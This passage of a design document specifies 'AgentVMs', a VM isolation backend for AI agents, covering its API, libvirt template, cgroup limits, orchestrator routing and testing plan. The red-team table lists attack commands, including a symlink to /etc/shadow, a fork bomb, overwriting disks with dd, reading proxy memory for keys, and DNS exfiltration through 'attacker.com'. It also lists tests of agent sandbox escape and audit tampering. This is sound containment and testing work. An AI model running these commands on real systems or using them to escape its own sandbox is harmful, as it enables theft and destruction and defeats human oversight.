CREATE INDEX idx_network_rules_session ON network_rules(session_id);
```

### 5.7 Observability (Unified Audit Format)

All events are emitted in a format compatible with the orchestrator's audit stream.

```python
@dataclass
class AuditEvent:
    timestamp: str                # ISO 8601
    session_id: str               # orchestrator session ID
    backend: str                  # "agentvm" | "clampdown"
    event_type: str               # see below
    actor: str                    # "orchestrator" | "agent" | "system"
    detail: dict                  # event-specific payload

    # Shared event types (both backends emit these):
    #   session.start, session.stop, session.error
    #   network.allow, network.block, network.reset
    #   proxy.request, proxy.error
    #   resource.limit_hit
    #   shared_folder.mount, shared_folder.unmount

    # AgentVMs-specific event types:
    #   vm.create, vm.boot, vm.shutdown, vm.crash
    #   vm.qemu_exit, vm.console_line
    #   vm.disk_create, vm.disk_delete
    #   vm.cgroup_limit_hit
    #   proxy.start, proxy.stop
```

```
┌──────────────────────────────────────────────────────────────────┐
│                    Observability                                  │
│                                                                  │
│  ┌─────────────────┐   ┌──────────────────────────────────────┐  │
│  │  Metrics        │   │  Logging                             │  │
│  │                 │   │                                      │  │
│  │  Per Session:   │   │  Per Session:                        │  │
│  │  - CPU usage %  │   │  - Serial console capture            │  │
│  │  - Memory used  │   │  - QEMU log output                   │  │
│  │  - Disk reads   │   │  - Network connections               │  │
│  │  - Disk writes  │   │  - Proxy request log                 │  │
│  │  - Net RX bytes │   │  - Shared folder access log          │  │
│  │  - Net TX bytes │   │                                      │  │
│  │  - VM state     │   │  Host:                               │  │
│  │  - Proxy reqs/s │   │  - API access log                    │  │
│  │  - Proxy errors │   │  - Lifecycle audit log (unified)     │  │
│  │                 │   │  - libvirtd log                      │  │
│  │  Host:          │   │  - Security alerts                   │  │
│  │  - Total CPU %  │   │                                      │  │
│  │  - Total RAM %  │   └──────────────────────────────────────┘  │
│  │  - Disk usage % │                                              │
│  │  - VM count     │   ┌──────────────────────────────────────┐  │
│  │  - Network flow │   │  Health                              │  │
│  │                 │   │                                      │  │
│  │  Source:        │   │  - VM boot detection                 │  │
│  │  - cgroups v2   │   │    (SSH reachability or              │  │
│  │  - libvirt API  │   │     QEMU guest agent ping)           │  │
│  │  - /proc/net    │   │  - Proxy health (HTTP probe)         │  │
│  │  - Prometheus   │   │  - Shared folder accessible          │  │
│  │    exporter     │   │  - Host health dashboard             │  │
│  │  - proxy logs   │   │  - Resource exhaustion alerts        │  │
│  └─────────────────┘   └──────────────────────────────────────┘  │
└──────────────────────────────────────────────────────────────────┘
```

---

## 6. API Specification (Enhanced)

### 6.1 Endpoints

```
Base URL: http://localhost:9090/api/v1
Auth:     Bearer token (API key passed in Authorization header)

# Session management (primary interface for orchestrator)
POST   /sessions                     Create a new session (VM + proxy + network + shared folder)
GET    /sessions                     List all sessions
GET    /sessions/{sid}               Get session details and status
DELETE /sessions/{sid}               Destroy session and all resources
GET    /sessions/{sid}/ssh           Get SSH connection info

# VM management (direct, for non-orchestrator use)
POST   /vms                          Create a new VM (legacy, wraps session creation)
GET    /vms                          List all VMs
GET    /vms/{vm_id}                  Get VM details
DELETE /vms/{vm_id}                  Destroy a VM

# Network policy (runtime control)
GET    /sessions/{sid}/network       Get current network policy and rules
POST   /sessions/{sid}/network/allow Allow outbound to domain:port
POST   /sessions/{sid}/network/block Block outbound to domain:port
POST   /sessions/{sid}/network/reset Reset network to startup defaults

# Auth proxy
GET    /sessions/{sid}/proxy         Get proxy status and config
GET    /sessions/{sid}/proxy/logs    Get proxy request logs

# Shared folder
GET    /sessions/{sid}/shared        Get shared folder info (host path, guest mount)
POST   /sessions/{sid}/shared/sync   Trigger resync (if using rsync fallback)

# Observability
GET    /sessions/{sid}/metrics       Get session resource metrics
GET    /sessions/{sid}/logs          Stream or fetch session logs
GET    /sessions/{sid}/audit         Get audit events for this session

# Host
GET    /health                       Host health check
GET    /capacity                     Available resources on host
GET    /metrics                      Prometheus-format metrics endpoint

# Images
POST   /images                       Upload a new base image
GET    /images                       List available base images (with capabilities)
GET    /images/{name}                Get image metadata (including capability hints)
DELETE /images/{name}                Remove a base image

# Orchestrator adapter
GET    /capabilities                 Backend capabilities (for orchestrator routing)
```

### 6.2 Session Creation Request/Response

**Request:**
```json
POST /api/v1/sessions
{
  "name": "agent-research-bot",
  "base_image": "ubuntu-24.04-amd64",
  "cpu_cores": 4,
  "memory_mb": 8192,
  "disk_gb": 50,
  "network_mbps": 100,
  "network_policy": "strict",
  "ssh_public_key": "ssh-ed25519 AAAA...",
  "api_keys": {
    "openai": "sk-real-openai-key-...",
    "anthropic": "sk-ant-real-key-..."
  },
  "shared_folder": {
    "project_path": "/home/user/my-project",
    "output_path": "/home/user/output",
    "permissions": "rw"
  },
  "metadata": {
    "agent_id": "agent-12345",
    "task": "code-review",
    "orchestrator_session": "orch-sess-abc"
  }
}
```

**Response:**
```json
{
  "id": "sess-a1b2c3d4",
  "vm_id": "vm-e5f67890",
  "name": "agent-research-bot",
  "status": "creating",
  "backend": "agentvm",
  "workload_type": "vm",
  "base_image": "ubuntu-24.04-amd64",
  "cpu_cores": 4,
  "memory_mb": 8192,
  "disk_gb": 50,
  "network_policy": "strict",
  "ssh": {
    "host": "10.0.0.2",
    "port": 22,
    "username": "root",
    "private_key_ref": "/api/v1/sessions/sess-a1b2c3d4/ssh"
  },
  "proxy": {
    "port": 23760,
    "base_url": "http://10.0.0.1:23760",
    "dummy_key": "sk-proxy-sess-a1b2c3d4"
  },
  "shared_folder": {
    "host_path": "/var/lib/agentvm/shared/sess-a1b2c3d4/",
    "guest_mount": "/mnt/shared/",
    "permissions": "rw"
  },
  "created_at": "2026-03-28T14:30:00Z",
  "metadata": {
    "agent_id": "agent-12345",
    "task": "code-review",
    "orchestrator_session": "orch-sess-abc"
  }
}
```

### 6.3 Capabilities Response (Orchestrator)

```json
GET /api/v1/capabilities
{
  "name": "agentvm",
  "backend_version": "1.0.0",
  "max_sessions": 20,
  "supports_kvm": true,
  "supports_gpu": false,
  "supports_nested_virt": true,
  "supports_runtime_network": true,
  "supports_filesystem_policy": true,
  "supports_secret_injection": true,
  "supports_shared_folder": true,
  "supports_auth_proxy": true,
  "enforcement_level": "host_kernel",
  "startup_latency_ms": 15000,
  "per_session_overhead_mb": 4096,
  "available_images": [
    {"name": "ubuntu-24.04-amd64", "capabilities": ["docker", "ssh"], "needs_kvm": false},
    {"name": "debian-12-amd64", "capabilities": ["docker", "ssh"], "needs_kvm": false},
    {"name": "grapheneos-cuttlefish", "capabilities": ["nested_virt", "seedvault"], "needs_kvm": true}
  ],
  "host_capacity": {
    "total_cpu": 16,
    "available_cpu": 10,
    "total_memory_mb": 65536,
    "available_memory_mb": 32768,
    "total_disk_gb": 500,
    "available_disk_gb": 300
  }
}
```

### 6.4 Error Responses

```json
// 400 - Bad request
{ "error": "invalid_spec", "detail": "cpu_cores must be between 1 and 32" }

// 409 - Conflict (name taken)
{ "error": "name_conflict", "detail": "VM name 'agent-research-bot' already exists" }

// 507 - Insufficient resources
{ "error": "capacity_exceeded", "detail": "Not enough memory: requested 8192MB, available 4096MB" }

// 404 - Not found
{ "error": "not_found", "detail": "Session sess-a1b2c3d4 not found" }

// 422 - Image not suitable
{ "error": "image_incompatible", "detail": "Image 'grapheneos-cuttlefish' requires KVM but host has no KVM available" }
```

---

## 7. CLI Specification (Enhanced)

```
agentvm — manage isolated VMs for AI agents

COMMANDS:
  session   Manage sessions (primary interface)
    create    Create a new session (VM + proxy + network + shared folder)
    destroy   Destroy a session and release all resources
    list      List all sessions
    status    Show session details and resource usage

  vm        Manage VMs directly (legacy)
    create    Create a VM
    destroy   Destroy a VM
    list      List VMs
    status    Show VM details

  network   Manage network policy at runtime
    allow     Allow outbound to domain:port
    block     Block outbound to domain:port
    reset     Reset network to startup defaults
    list      Show current network rules

  proxy     Manage auth proxy
    status    Show proxy status for a session
    logs      Show proxy request logs

  shared    Manage shared folders
    info      Show shared folder paths and permissions
    sync      Trigger resync

  ssh       Get SSH command or open SSH session
  logs      Tail session logs
  audit     Show audit events
  images    Manage base images
  host      Show host health and capacity

EXAMPLES:
  # Create a session with all features
  agentvm session create \
    --name my-agent \
    --image ubuntu-24.04-amd64 \
    --cpu 4 --memory 8G --disk 50G \
    --ssh-key ~/.ssh/id_ed25519.pub \
    --network-policy strict \
    --api-key openai=sk-... \
    --api-key anthropic=sk-ant-... \
    --shared-folder ./project:/mnt/shared/project

  # Runtime network control
  agentvm network allow sess-a1b2c3d4 api.openai.com --port 443
  agentvm network block sess-a1b2c3d4 telemetry.example.com
  agentvm network list sess-a1b2c3d4
  agentvm network reset sess-a1b2c3d4

  # Inspect
  agentvm session status sess-a1b2c3d4
  agentvm ssh sess-a1b2c3d4
  agentvm proxy logs sess-a1b2c3d4 --follow
  agentvm audit --session sess-a1b2c3d4 --last 50

  # Cleanup
  agentvm session destroy sess-a1b2c3d4

GLOBAL OPTIONS:
  --api-url    API endpoint (default: http://localhost:9090)
  --api-key    Authentication key
  --format     Output format: table, json, yaml
  --verbose    Verbose output
```

---

## 8. Nested Virtualization Configuration

This is what allows agents to run Docker/Podman and KVM inside their VMs.

```
Host requirements:
  1. CPU with VT-x/AMD-V and EPT/NPT
  2. Module loaded: kvm_intel or kvm_amd
  3. Nested virt enabled:
     # Intel
     echo 1 > /sys/module/kvm_intel/parameters/nested
     # AMD
     echo 1 > /sys/module/kvm_amd/parameters/nested
  4. Verify: cat /sys/module/kvm_intel/parameters/nested → Y

Libvirt VM configuration (applied to every agent VM):
  <cpu mode='host-passthrough' check='none'>
    <feature policy='require' name='vmx'/>   <!-- Intel -->
    <!-- OR -->
    <feature policy='require' name='svm'/>   <!-- AMD -->
  </cpu>

  <!-- Nested virt requires full TCG fallback disabled -->
  <features>
    <kvm>
      <hidden state='on'/>   <!-- hide KVM from guest (prevents detection) -->
    </kvm>
  </features>

What the agent can do inside the VM:
  ✓ Run docker (needs overlayfs + cgroups, works out of box)
  ✓ Run podman (rootless, works out of box)
  ✓ Run KVM nested VMs (needs vmx/svm exposed)
  ✓ Install any software (full root, full Linux)
  ✗ See outside the VM (no shared memory, no host filesystem)
  ✗ Access other VMs (blocked at network layer)
  ✗ Exhaust host resources (cgroup limits)
  ✗ Access real API keys (only proxy dummy key available)
  ✗ Read other sessions' shared folders (per-session isolation)
```

---

## 9. VM XML Template (libvirt domain definition)

```xml
<domain type='kvm' xmlns:qemu='http://libvirt.org/schemas/domain/qemu/1.0'>
  <name>vm-{uuid}</name>
  <uuid>{uuid}</uuid>
  <memory unit='MiB'>{memory_mb}</memory>
  <vcpu placement='static'>{cpu_cores}</vcpu>

  <!-- CPU pinning: bind vCPUs to specific physical cores -->
  <cputune>
    {cpu_pins}
    <!-- Example: <vcpupin vcpu='0' cpuset='4'/> -->
  </cputune>

  <!-- NUMA awareness for memory locality -->
  <numatune>
    <memory mode='strict' nodeset='{numa_node}'/>
  </numatune>

  <!-- Nested virtualization: expose hardware virt to guest -->
  <cpu mode='host-passthrough' check='none'>
    <feature policy='require' name='vmx'/>
    <feature policy='disable' name='hypervisor'/>
  </cpu>

  <!-- Memory: lock pages, prevent host swap -->
  <memoryBacking>
    <locked/>
  </memoryBacking>

  <os>
    <type arch='x86_64' machine='pc-q35-8.2'>hvm</type>
    <boot dev='hd'/>
  </os>

  <features>
    <acpi/>
    <apic/>
    <!-- Hide hypervisor from guest (prevents "am I in a VM?" detection) -->
    <kvm>
      <hidden state='on'/>
    </kvm>
    <!-- Restrict MSRs to prevent side-channel attacks -->
    <msrs state='on' unknown='ignore'/>
  </features>

  <!-- Clock: use host-independent source -->
  <clock offset='utc'>
    <timer name='rtc' tickpolicy='catchup'/>
    <timer name='pit' tickpolicy='delay'/>
    <timer name='hpet' present='no'/>
  </clock>

  <devices>
    <!-- Disk: virtio-blk for performance -->
    <disk type='file' device='disk'>
      <driver name='qemu' type='qcow2' cache='none' io='native'/>
      <source file='{disk_path}'/>
      <target dev='vda' bus='virtio'/>
      <address type='pci' domain='0x0000' bus='0x04' slot='0x00' function='0x0'/>
    </disk>

    <!-- Cloud-init ISO for first-boot configuration -->
    <disk type='file' device='cdrom'>
      <driver name='qemu' type='raw'/>
      <source file='{cloud_init_iso}'/>
      <target dev='sda' bus='sata'/>
      <readonly/>
    </disk>

    <!-- Shared folder: virtiofs (preferred) -->
    <filesystem type='mount' accessmode='passthrough'>
      <driver type='virtiofs'/>
      <source dir='{shared_folder_host_path}'/>
      <target dir='shared'/>
      <address type='pci' domain='0x0000' bus='0x05' slot='0x00' function='0x0'/>
    </filesystem>
    <!-- Fallback: 9p -->
    <!--
    <filesystem type='mount' accessmode='mapped'>
      <source dir='{shared_folder_host_path}'/>
      <target dir='shared'/>
      <address type='pci' domain='0x0000' bus='0x05' slot='0x00' function='0x0'/>
    </filesystem>
    -->

    <!-- Network: virtio-net on isolated bridge -->
    <interface type='bridge'>
      <source bridge='{bridge_name}'/>
      <model type='virtio'/>
      <target dev='{vnet_name}'/>
      <address type='pci' domain='0x0000' bus='0x01' slot='0x00' function='0x0'/>
    </interface>

    <!-- Serial console for headless access -->
    <serial type='file'>
      <source path='{console_log}'/>
    </serial>
    <console type='file'>
      <source path='{console_log}'/>
    </console>

    <!-- QEMU Guest Agent (for in-VM operations) -->
    <channel type='unix'>
      <source mode='bind' path='{ga_socket}'/>
      <target type='virtio' name='org.qemu.guest_agent.0'/>
    </channel>

    <!-- RNG: virtio-rng for entropy -->
    <rng model='virtio'>
      <backend model='random'>/dev/urandom</backend>
    </rng>

    <!-- DISABLED: everything unnecessary -->
    <!-- No USB controller -->
    <!-- No sound card -->
    <!-- No video/graphics (headless) -->
    <!-- No smartcard -->
    <!-- No tablet -->
    <!-- No watchdog -->
    <!-- No memballoon (prevents guest from manipulating memory reporting) -->
  </devices>

  <!-- Resource limits: prevent QEMU process from consuming host resources -->
  <resource>
    <partition>/machine</partition>
  </resource>

  <!-- seccomp sandbox for QEMU process itself -->
  <seccomp/>
</domain>
```

---

## 10. cgroups v2 Resource Enforcement

```
After VM starts, agentvm daemon places QEMU process in constrained cgroup:

/sys/fs/cgroup/agentvm.slice/vm-{uuid}.scope/

# CPU: pin to specific cores + set quota
echo "0-3" > cpuset.cpus           # only run on cores 0-3
echo "0" > cpuset.mems             # only use NUMA node 0
echo "400000 100000" > cpu.max     # 400ms per 100ms period = 4 cores max

# Memory: hard limit
echo "8589934592" > memory.max     # 8GB hard limit
echo "8589934592" > memory.high    # 8GB soft limit (triggers reclaim)

# I/O: throttle disk
echo "8:0 rbps=1073741824 wbps=1073741824" > io.max
  # 1GB/s read, 1GB/s write on device 8:0

# PIDs: prevent fork bombs
echo "1000" > pids.max             # max 1000 processes
```

---

## 11. Orchestrator Contract

AgentVMs implements the `IsolationBackend` protocol so that an orchestrator can route workloads uniformly between AgentVMs and clampdown.

### 11.1 Backend Protocol

```python
from typing import Protocol

class IsolationBackend(Protocol):
    """Uniform interface the orchestrator uses to manage workloads."""

    def create_session(self, spec: WorkloadSpec) -> Session:
        """Create an isolated workload. Returns once the session is reachable."""
        ...

    def destroy_session(self, session_id: str) -> None:
        """Hard-kill the session and clean up all resources."""
        ...

    def get_session_status(self, session_id: str) -> SessionStatus:
        """Current state, resource usage, health."""
        ...

    def list_sessions(self, owner: str | None = None) -> list[SessionStatus]:
        """All sessions, optionally filtered by owner."""
        ...

    # --- Runtime policy (both backends must support) ---

    def allow_network(self, session_id: str, domain: str, port: int | None = None) -> None:
        """Allow outbound to domain:port."""
        ...

    def block_network(self, session_id: str, domain: str, port: int | None = None) -> None:
        """Block outbound to domain:port."""
        ...

    def reset_network(self, session_id: str) -> None:
        """Reset network to startup defaults."""
        ...

    def get_network_rules(self, session_id: str) -> list[NetworkRule]:
        """Current network policy state."""
        ...

    def inject_secret(self, session_id: str, key: str, value: str) -> None:
        """Make a secret available inside the session (via proxy)."""
        ...

    def get_ssh_info(self, session_id: str) -> SSHInfo:
        """Get SSH connection details."""
        ...

    # --- Capability query (for orchestrator routing) ---

    def capabilities(self) -> BackendCapabilities:
        """What this backend supports."""
        ...
```

### 11.2 Backend Capabilities

```python
@dataclass
class BackendCapabilities:
    name: str                    # "agentvm" | "clampdown"
    max_sessions: int
    supports_kvm: bool
    supports_gpu: bool
    supports_nested_virt: bool
    supports_runtime_network: bool
    supports_filesystem_policy: bool   # host-enforced file restrictions
    supports_secret_injection: bool
    supports_shared_folder: bool
    supports_auth_proxy: bool
    enforcement_level: str       # "host_kernel" (both) | "guest_kernel"
    startup_latency_ms: int      # typical session start time
    per_session_overhead_mb: int # typical memory overhead
    available_images: list[ImageSummary]
    host_capacity: CapacityInfo
```

### 11.3 Orchestrator Routing

```python
class Orchestrator:
    def __init__(self, backends: dict[str, IsolationBackend]):
        self.backends = backends

    def route(self, spec: WorkloadSpec) -> str:
        """Decide which backend handles this workload."""

        # Hard requirements
        if spec.needs_kvm or spec.needs_nested_virt:
            return "agentvm"

        if spec.needs_gpu:
            return "agentvm"

        # Image-specific routing
        if spec.base_image:
            for name, backend in self.backends.items():
                images = backend.capabilities().available_images
                if any(i.name == spec.base_image for i in images):
                    return name

        # Security requirements
        if spec.enforcement_level == "host_kernel":
            # Both backends support this; prefer clampdown for density
            if spec.memory_mb >= 2048:
                return "agentvm"
            return "clampdown"

        # Performance requirements
        if spec.max_startup_ms and spec.max_startup_ms < 5000:
            return "clampdown"

        # Density requirements
        if spec.memory_mb < 512:
            return "clampdown"

        # Default: prefer clampdown for density
        return "clampdown"
```

### 11.4 Feature Parity Matrix

| Capability | clampdown | AgentVMs | Orchestrator Sees |
|---|---|---|---|
| Session management | ✓ | ✓ | Uniform |
| Runtime network control | ✓ (`allow/block/reset`) | ✓ (`allow/block/reset`) | Uniform API |
| Secret injection | ✓ (auth proxy) | ✓ (auth proxy) | Uniform API |
| Shared folder | ✓ (workdir bind mount) | ✓ (virtiofs/9p) | `supports_shared_folder` |
| Filesystem policy | ✓ (Landlock, host-kernel) | Partial (AppArmor, guest-kernel) | `enforcement_level` |
| Audit events | ✓ (unified format) | ✓ (unified format) | Uniform stream |
| KVM / nested virt | ✗ | ✓ | `supports_kvm` |
| GPU passthrough | ✗ | Partial | `supports_gpu` |
| Startup latency | ~ms (container) | ~15s (VM boot) | `startup_latency_ms` |
| Density | ~hundreds | ~5-10 | `max_sessions` |
| Image capabilities | N/A (container images) | ✓ (capability hints) | Routing input |

---

## 12. Testing Strategy

Security-critical infrastructure demands exhaustive testing. Three tiers: unit tests validate logic, integration tests validate real VM operations, and red-team tests attempt to break isolation.

### 12.1 Unit Tests

Test individual components in isolation with mocked libvirt/cgroup/iptables.

```
tests/unit/
├── test_session.py              # Session lifecycle state machine
├── test_vm_manager.py           # VM creation, destruction, validation
├── test_xml_builder.py          # libvirt XML generation
├── test_network_policy.py       # Policy mode logic, rule generation
├── test_storage.py              # Disk overlay, shared folder, proxy config
├── test_auth_proxy.py           # Proxy config generation, key management
├── test_cloud_init.py           # Cloud-init ISO generation
├── test_capacity.py             # Resource checking, quota enforcement
├── test_metadata_store.py       # SQLite operations, migrations
├── test_audit.py                # Audit event generation, formatting
├── test_orchestrator_adapter.py # Capability reporting, session conversion
├── test_image_metadata.py       # Image capability parsing, routing hints
└── test_cli.py                  # CLI argument parsing, output formatting
```

Coverage targets:
- `vm_manager.py`: ≥95% (critical path)
- `network_policy.py`: ≥95% (security-critical)
- `auth_proxy.py`: ≥90% (security-critical)
- `xml_builder.py`: ≥90%
- All other modules: ≥80%

### 12.2 Integration Tests

Test real VM operations against a host with KVM available.

```
tests/integration/
├── test_vm_lifecycle.py         # Create → boot → SSH → destroy (real VMs)
├── test_nested_virt.py          # Verify nested KVM works inside VM
├── test_isolation.py            # Verify VMs can't reach each other or host
├── test_resource_limits.py      # stress-ng cannot exceed cgroup limits
├── test_shared_folder.py        # Host↔VM file transfer via virtiofs
├── test_auth_proxy.py           # Proxy intercepts and forwards API calls
├── test_network_modes.py        # strict/restricted/permissive behavior
├── test_network_runtime.py      # Runtime allow/block/reset changes take effect
├── test_proxy_security.py       # VM can't reach upstream without proxy
├── test_shared_folder_escape.py # VM can't escape shared folder boundary
├── test_session_api.py          # Full REST API lifecycle
├── test_concurrent_vms.py       # Multiple VMs running simultaneously
├── test_vm_crash_recovery.py    # QEMU crash cleanup
└── test_image_management.py     # Upload, list, delete base images
```

Each integration test includes:
- Setup: host prerequisite check (KVM available, libvirtd running)
- Execution: real VM creation and operation
- Verification: actual network/f filesystem / process state checks
- Cleanup: guaranteed VM destruction (even on test failure)

### 12.3 E2E Tests

Test the full workflow from API call to running agent.

```
tests/e2e/
├── test_full_session.py         # API → session creation → SSH → agent runs → cleanup
├── test_agent_workflow.py       # Agent in VM uses proxy to call API, writes to shared folder
├── test_orchestrator_routing.py # Orchestrator selects AgentVMs vs clampdown
├── test_multi_session.py        # Multiple sessions running concurrently
├── test_shared_folder_workflow.py # Host writes project, VM reads/modifies/writes output
├── test_network_workflow.py     # Start strict, allow domain at runtime, verify access
├── test_proxy_workflow.py       # Agent calls API through proxy, gets real response
├── test_crash_recovery.py       # Kill QEMU process, verify cleanup
└── test_host_capacity.py        # Fill host capacity, verify rejection
```

### 12.4 Red-Team Tests

Automated adversarial tests that attempt to break isolation. These run in CI and must all pass before any release.

```
tests/redteam/
├── test_escape_shared_folder.py    # Attempt to escape shared folder via symlinks, .., mount tricks
├── test_escape_network.py          # Attempt to reach host, other VMs, private CIDRs
├── test_escape_cgroup.py           # Attempt to exceed resource limits (fork bomb, OOM)
├── test_escape_proxy.py            # Attempt to extract real API keys from proxy
├── test_escape_virtiofs.py         # Attempt to exploit virtiofs for host access
├── test_escape_qemu_device.py      # Attempt QEMU device model exploitation
├── test_escape_svirt.py            # Attempt to access other VMs' disk files
├── test_escape_cloud_init.py       # Attempt to modify cloud-init injected config
├── test_escape_nested_virt.py      # Attempt host access via nested KVM
├── test_reconnaissance.py          # Attempt to detect host OS, kernel, other VMs
├── test_denial_of_service.py       # Attempt to crash host or other VMs
├── test_data_exfiltration.py       # Attempt to exfiltrate data via DNS, ICMP, timing
└── test_audit_tampering.py         # Attempt to forge or delete audit logs
```

#### 12.4.1 Red-Team Test Structure

Each red-team test follows a standard pattern:

```python
class RedTeamTest:
    """
    Base class for adversarial tests.

    Each test:
    1. Creates a session with a specific attack surface
    2. Executes the attack from inside the VM (via SSH)
    3. Verifies the attack FAILED
    4. Reports what would have happened if it succeeded
    """

    def setup(self) -> Session:
        """Create a session for this test."""

    def execute_attack(self, session: Session) -> AttackResult:
        """Run the attack from inside the VM."""

    def verify_containment(self, session: Session, result: AttackResult) -> bool:
        """Verify the attack did not escape."""

    def teardown(self, session: Session):
        """Clean up."""
```

#### 12.4.2 Attack Categories

| Category | Test | Expected Result | If It Failed... |
|---|---|---|---|
| **Shared folder** | Symlink escape via `ln -s /etc/shadow /mnt/shared/link` | VM sees symlink pointing inside shared folder boundary only | VM can read host files |
| **Shared folder** | `mount --bind / /mnt/shared/escape` | Blocked by AppArmor/guest policy | VM exposes entire host filesystem |
| **Shared folder** | `../` traversal in path | Blocked by virtiofs/9p | VM escapes shared folder root |
| **Network** | `curl http://10.0.0.1:9090/` (host API) | Connection refused / timeout | VM accesses host API |
| **Network** | `curl http://10.0.0.3/` (other VM) | Connection refused / timeout | VM-to-VM lateral movement |
| **Network** | `curl http://192.168.1.1/` (private CIDR) | Connection refused / timeout | VM accesses private network |
| **Network** | DNS tunneling via `dig @attacker.com` | Rate limited / blocked | Data exfiltration via DNS |
| **Proxy** | Read proxy process memory via `/proc/<pid>/mem` | Permission denied | Key extraction from proxy |
| **Proxy** | Connect directly to `api.openai.com:443` | Connection refused (no route) in strict mode; auth failure (no real key) | API access without proxy |
| **Proxy** | Replay proxy request with modified headers | Proxy validates source IP + dummy key | Proxy impersonation |
| **Resources** | `:(){ :|:& };:` (fork bomb) | PID limit enforced, VM stays alive | Host resource exhaustion |
| **Resources** | `stress-ng --vm 16 --vm-bytes 100%` | OOM killed within VM, not host | Host OOM |
| **Resources** | `dd if=/dev/zero of=/dev/vda bs=1M` | IO throttling enforced | Host disk exhaustion |
| **QEMU** | Malformed QEMU guest agent commands | Rejected / no effect | QEMU process exploitation |
| **QEMU** | Access `/dev/kvm` inside VM | Not present | Nested virt escape |
| **Recon** | `cat /proc/version` | Returns VM kernel version | Host kernel fingerprinting |
| **Recon** | `arp -a` | Shows only gateway (10.0.0.1) | VM enumeration |
| **Recon** | `lscpu` | Returns VM CPU config | Host CPU fingerprinting |

#### 12.4.3 Red-Team CI Integration

```yaml
# .github/workflows/redteam.yml
name: Red-Team Security Tests
on: [push, pull_request, schedule]

jobs:
  redteam:
    runs-on: self-hosted   # Must have KVM
    steps:
      - uses: actions/checkout@v4
      - name: Check host prerequisites
        run: |
          ls /dev/kvm || (echo "KVM not available" && exit 1)
          which libvirtd || (echo "libvirtd not installed" && exit 1)
      - name: Run red-team tests
        run: |
          python -m pytest tests/redteam/ -v --tb=long --timeout=600
      - name: Run isolation integration tests
        run: |
          python -m pytest tests/integration/test_isolation.py -v
          python -m pytest tests/integration/test_shared_folder_escape.py -v
          python -m pytest tests/integration/test_auth_proxy.py -v
      - name: Upload results
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: redteam-results
          path: test-results/
```

### 12.5 Test Infrastructure

```
tests/
├── conftest.py                   # Shared fixtures (libvirt connection, temp dirs)
├── mocks/
│   ├── mock_libvirt.py           # Mock libvirt connection for unit tests
│   ├── mock_cgroup.py            # Mock cgroup filesystem
│   └── mock_iptables.py          # Mock iptables commands
├── fixtures/
│   ├── base-images/              # Small test images (100MB each)
│   │   ├── test-ubuntu.qcow2
│   │   └── test-debian.qcow2
│   ├── cloud-init/               # Test cloud-init configs
│   └── proxy-keys/               # Test API keys (fake, for proxy tests)
├── helpers/
│   ├── ssh.py                    # SSH connection helpers
│   ├── network.py                # Network probing helpers (ping, curl, nmap)
│   ├── vm.py                     # VM lifecycle helpers
│   └── attack.py                 # Red-team attack execution helpers
├── unit/
├── integration/
├── e2e/
└── redteam/
```

---

## 13. Project Directory Structure

```
agentvm/
├── pyproject.toml              # Python project config
├── README.md
├── AGENTS.md                   # Development guidance
├── docs/
│   └── design.md               # This document
│
├── src/
│   └── agentvm/
│       ├── __init__.py
│       ├── config.py            # Configuration loading (YAML/env/CLI)
│       ├── daemon.py            # FastAPI application + startup/shutdown
│       │
│       ├── vm/
│       │   ├── __init__.py
│       │   ├── manager.py       # Core VM lifecycle (create/destroy/status)
│       │   ├── spec.py          # VM specification dataclasses
│       │   ├── xml_builder.py   # libvirt XML template engine
│       │   └── state.py         # VM state machine
│       │
│       ├── session/
│       │   ├── __init__.py
│       │   ├── manager.py       # Session lifecycle (create/destroy/status)
│       │   ├── model.py         # WorkloadSession dataclass
│       │   └── state.py         # Session state machine
│       │
│       ├── net/
│       │   ├── __init__.py
│       │   ├── bridge.py        # Bridge creation and management
│       │   ├── firewall.py      # iptables rule management
│       │   ├── dhcp.py          # dnsmasq integration
│       │   ├── rate_limit.py    # tc (traffic control) integration
│       │   └── policy.py        # NetworkPolicyEngine (allow/block/reset)
│       │
│       ├── storage/
│       │   ├── __init__.py
│       │   ├── pool.py          # Storage pool management
│       │   ├── images.py        # Base image management + metadata
│       │   ├── disks.py         # qcow2 overlay creation/deletion
│       │   ├── cloud_init.py    # cloud-init ISO generation
│       │   └── shared.py        # Shared folder management (virtiofs/9p)
│       │
│       ├── proxy/
│       │   ├── __init__.py
│       │   ├── manager.py       # Auth proxy lifecycle (start/stop/health)
│       │   ├── config.py        # Proxy config generation
│       │   └── client.py        # HTTP client for proxy health checks
│       │
│       ├── host/
│       │   ├── __init__.py
│       │   ├── capacity.py      # Resource availability checks
│       │   ├── cgroups.py       # cgroups v2 enforcement
│       │   ├── hardening.py     # Host security verification
│       │   └── cpu_map.py       # CPU topology and pinning logic
│       │
│       ├── observe/
│       │   ├── __init__.py
│       │   ├── metrics.py       # Prometheus metrics collection
│       │   ├── logging_cfg.py   # Structured logging setup
│       │   ├── audit.py         # Audit trail (unified format)
│       │   └── health.py        # VM and host health checks
│       │
│       ├── api/
│       │   ├── __init__.py
│       │   ├── app.py           # FastAPI router definitions
│       │   ├── routes/
│       │   │   ├── sessions.py  # Session CRUD endpoints
│       │   │   ├── vms.py       # VM CRUD endpoints (legacy)
│       │   │   ├── network.py   # Network policy endpoints
│       │   │   ├── proxy.py     # Proxy status/logs endpoints
│       │   │   ├── shared.py    # Shared folder endpoints
│       │   │   ├── images.py    # Image management endpoints
│       │   │   └── health.py    # Health/capacity/capabilities endpoints
│       │   ├── schemas.py       # Pydantic request/response models
│       │   ├── auth.py          # API key authentication
│       │   └── errors.py        # Error handling middleware
│       │
│       ├── orchestrator/
│       │   ├── __init__.py
│       │   ├── backend.py       # IsolationBackend protocol implementation
│       │   └── capabilities.py  # BackendCapabilities reporting
│       │
│       ├── cli/
│       │   ├── __init__.py
│       │   └── main.py          # Click CLI commands
│       │
│       └── db/
│           ├── __init__.py
│           ├── store.py         # SQLite operations (aiosqlite)
│           └── migrations.py    # Schema migrations
│
├── proxy/                       # Auth proxy binary (Go, built separately)
│   ├── cmd/
│   │   └── proxy/
│   │       └── main.go          # Proxy entrypoint
│   ├── internal/
│   │   ├── handler.go           # HTTP handler with key injection
│   │   ├── config.go            # Config parsing
│   │   └── validate.go          # Request validation (source IP, dummy key)
│   └── Makefile                 # Static binary build (CGO_ENABLED=0)
│
├── config/
│   ├── agentvm.yaml             # Default configuration
│   └── host-hardening.sh        # Host setup script
│
├── images/
│   ├── build-base-image.sh      # Packer/custom script to build golden images
│   └── cloud-init/
│       ├── meta-data.yaml
│       └── user-data.yaml       # Default cloud-init config
│
├── tests/
│   ├── conftest.py
│   ├── mocks/
│   │   ├── mock_libvirt.py
